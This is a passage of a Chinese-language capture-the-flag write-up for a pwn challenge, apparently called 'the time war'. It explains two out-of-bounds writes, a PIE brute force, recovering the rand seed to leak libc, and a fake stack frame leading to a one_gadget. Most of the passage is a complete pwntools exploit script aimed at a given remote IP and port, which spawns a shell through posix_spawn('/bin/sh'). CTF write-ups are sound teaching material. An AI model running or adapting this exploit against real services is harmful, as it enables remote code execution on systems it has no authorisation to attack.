    printf("The box remains locked.\n");
}

int main(void) {
    init();
    run();
    return 0;
}
```

有两个越界写，可以用来劫持

由于有 pie ，第一次劫持的时候需要去爆 1/16

这题需要打 libc ，由于随机数种子为 clock_gettime 的地址的低 4 字节，我们可以去根据生成的随机数去爆破种子从而 leak libc 的一部分

4 个随机数不够，8 个刚好

最后通过伪造栈帧去打 onegadget 即可，不过会碰到缺 libc 的高 4 字节的问题，这一点可以通过把栈上残留值搬到缺失的位置上来解决，需要利用 scanf 解析失败保留原变量值的特性

### exp

```python
from pwn import *
from ctypes import CDLL

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './pwn_the_time_war_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')
glibc = CDLL('libc.so.6')

target = '60.205.163.215'
port = 13774

def conn():
    if debug:
        return process(file)
    else:
        return remote(target, port)

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

p = io = None

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))

numslot = []
seed = 0

def change(idx, val):
    sla(b'turn? ', str(idx).encode())
    sla(b'to? ', str(val).encode())

def recvnum():
    ru(b'lock reads: ')
    for _ in range(3):
        numslot.append(int(ru(b'-')[:-1]))
    numslot.append(int(ru(b'\n')[:-1]))

def hijacklow(idx, addr):
    libc_low = seed - 0xcf420 + addr
    change(10, 0x132A)
    change(idx, libc_low & 0xffff)
    change(10, 0x132A)
    change(idx + 1, (libc_low >> 16) & 0xffff)

def attack():
    global p, io, numslot, seed
    while True:
        try:
            p = io = conn()
            numslot.clear()
            recvnum()
            change(10, 0x132A)
            change(28, '+')
            recvnum()
        except:
            p.close()
            continue
        break
    log.info(f'{numslot}')
    for i in range(0, 0x100000):
        seed = i * 0x1000 + 0x420
        glibc.srand(seed)
        judgeslot = [glibc.rand() % 16 for _ in range(8)]
        if judgeslot == numslot:
            numslot.clear()
            log.info(f"Found the correct seed: {hex(seed)}")
            break
    hijacklow(18, 0x319ad)
    hijacklow(26, 0x4c139)
    change(0, 0)
    change(0, 0)
    itr()

attack()

# 0x00000000000319ad: pop rbx; ret;

# 0x4c139 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x60 is writable
#   rsp & 0xf == 0
#   rax == NULL || {"sh", rax, r12, NULL} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0x4c140 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
# constraints:
#   address rsp+0x60 is writable
#   rsp & 0xf == 0
#   rcx == NULL || {rcx, rax, r12, NULL} is a valid argv
#   rbx == NULL || (u16)[rbx] == NULL

# 0xd515f execve("/bin/sh", rbp-0x40, r13)
# constraints:
#   address rbp-0x38 is writable
#   rdi == NULL || {"/bin/sh", rdi, NULL} is a valid argv
#   [r13] == NULL || r13 == NULL || r13 is a valid envp
```